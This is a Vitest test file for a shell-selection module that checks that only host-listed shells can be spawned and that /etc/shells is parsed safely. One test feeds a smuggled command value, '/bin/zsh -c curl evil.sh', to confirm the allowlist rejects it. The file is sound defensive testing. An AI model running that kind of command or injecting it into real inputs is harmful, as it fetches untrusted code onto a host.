import { describe, expect, it, vi } from 'vitest';

import { discoverShells, resolveShell } from './shells.ts';

describe('resolveShell', () => {
  const available = ['/bin/zsh', '/bin/bash', '/bin/sh'];

  it('takes the default when the client expressed no preference', () => {
    expect(resolveShell(undefined, available)).toBe('/bin/zsh');
  });

  it('honours a choice that is on the host list', () => {
    expect(resolveShell('/bin/bash', available)).toBe('/bin/bash');
  });

  it('REFUSES anything the host did not offer, rather than spawning it', () => {
    // The whole point of the allowlist: the executable a request spawns is the one thing the
    // worktree discipline never covers, so a path the client invented must not reach `spawn`.
    expect(resolveShell('/usr/bin/env', available)).toBeNull();
    expect(resolveShell('/bin/zsh -c curl evil.sh', available)).toBeNull();
    expect(resolveShell('', available)).toBeNull();
  });

  it('still answers when the host could enumerate nothing', () => {
    expect(resolveShell(undefined, [])).toMatch(/\S/);
  });
});

describe('discoverShells', () => {
  it('always offers at least the host default, first', () => {
    const shells = discoverShells();
    expect(shells.length).toBeGreaterThan(0);
    expect(shells[0]).toBe(process.env.SHELL ?? (process.platform === 'win32' ? process.env.ComSpec ?? 'cmd.exe' : '/bin/bash'));
  });

  it('never repeats one', () => {
    const shells = discoverShells();
    expect(new Set(shells).size).toBe(shells.length);
  });

  it('survives a host with no /etc/shells', () => {
    // A slim container, or a platform that keeps no such file. The default alone is an honest
    // answer; refusing to enumerate must never cost the user a terminal.
    const shells = discoverShells(() => {
      throw new Error('ENOENT');
    });
    expect(shells).toEqual([process.env.SHELL ?? '/bin/bash']);
  });

  it('reads the host list, keeps order, and drops comments and blanks', () => {
    const shells = discoverShells(() => `# comment\n\n${process.env.SHELL ?? '/bin/bash'}\n/nope/not-here\n`);
    // `/nope/not-here` does not exist, so it is not offered — the list is what this host can
    // actually open, not what the file claims.
    expect(shells).not.toContain('/nope/not-here');
    expect(shells[0]).toBe(process.env.SHELL ?? '/bin/bash');
  });
});
